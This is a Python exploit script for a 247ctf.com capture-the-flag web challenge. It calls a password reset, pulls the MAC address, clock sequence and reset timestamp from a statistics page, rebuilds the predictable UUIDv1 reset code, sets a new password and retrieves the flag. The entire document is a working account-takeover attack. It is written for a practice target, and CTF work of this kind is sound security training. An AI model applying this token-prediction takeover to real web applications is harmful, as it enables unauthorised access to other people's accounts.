#!/usr/bin/env python3

import uuid
import requests
import pandas as pd
import numpy as np

# Set URL to challenge
URL = "https://6a654ff23a794a05.247ctf.com"

# Arbitrary password
password = "1234"


def str_to_ns(time_str):
    h, m, s = time_str.split(":")
    int_s, ns = s.split(".")
    ns = map(
        lambda t, unit: np.timedelta64(int(t), unit),
        [h, m, int_s, ns.ljust(9, "0")],
        ["h", "m", "s", "ns"],
    )
    return sum(ns)


# return MAC address as int
def parse_mac(mac):
    return int(mac.replace(":", ""), 16)


# Modified uuid1() from python uuid library
def uuid1(node, clock_seq, ts):
    timestamp = ts // 100 + 0x01B21DD213814000
    time_low = timestamp & 0xFFFFFFFF
    time_mid = (timestamp >> 32) & 0xFFFF
    time_hi_version = (timestamp >> 48) & 0x0FFF
    clock_seq_low = clock_seq & 0xFF
    clock_seq_hi_variant = (clock_seq >> 8) & 0x3F
    return uuid.UUID(
        fields=(
            time_low,
            time_mid,
            time_hi_version,
            clock_seq_hi_variant,
            clock_seq_low,
            node,
        ),
        version=1,
    )


def generate_uuid():
    r = requests.get(URL + "/statistics")
    lines = r.text.strip().splitlines()

    mac = None
    clock_sequence = None
    ldate = None
    ltime = None

    for line in lines:
        line = line.strip()
        if line.startswith("MAC"):
            parts = line.split()
            if len(parts) >= 2:
                mac = parts[1]
        elif line.startswith("clock sequence"):
            parts = line.split()
            if len(parts) >= 3:
                clock_sequence = parts[2]
        elif line.startswith("last reset"):
            last_reset_str = line[len("last reset ") :]
            if " " in last_reset_str:
                ldate, ltime = last_reset_str.split(" ", 1)

    if not all([mac, clock_sequence, ldate, ltime]):
        print("Error: failed to parse all required fields from /statistics")
        print("Response was:\n", r.text)
        return None

    print()
    print("MAC              : " + mac)
    print("Clock sequence   : " + str(clock_sequence))
    print("Last reset       : " + ldate, ltime)

    nseconds = pd.to_datetime(ldate, format="%Y-%m-%d").timestamp() * 1_000_000_000
    time_in_ns = str_to_ns(ltime) + int(nseconds)

    UUID = uuid1(parse_mac(mac), int(clock_sequence), int(time_in_ns))

    print("UUID.time        :", UUID.time)
    print("UUID.clock_seq   :", UUID.clock_seq)
    print("UUID.node        :", UUID.node)
    print("UUID generated is:", UUID)

    return str(UUID)


print("Exploiting Web / Administrative ORM @ 247ctf.com")

r = requests.get(URL + "/reset")
print()
print("-> requests.get(" + URL + "/reset)")
print(r.text)

guessed_uuid = generate_uuid()
if guessed_uuid is None:
    print("Failed to generate UUID. Exiting.")
    exit(1)

r = requests.get(URL + "/update_password?reset_code=" + guessed_uuid + "&password=" + password)
print()
print(
    "-> requests.get("
    + URL
    + "/update_password?reset_code="
    + guessed_uuid
    + "&password="
    + password
    + ")"
)
print(r.text)

r = requests.get(URL + "/get_flag?password=" + password)
print()
print("-> requests.get(" + URL + "/get_flag?password=" + password + ")")
print(r.text)
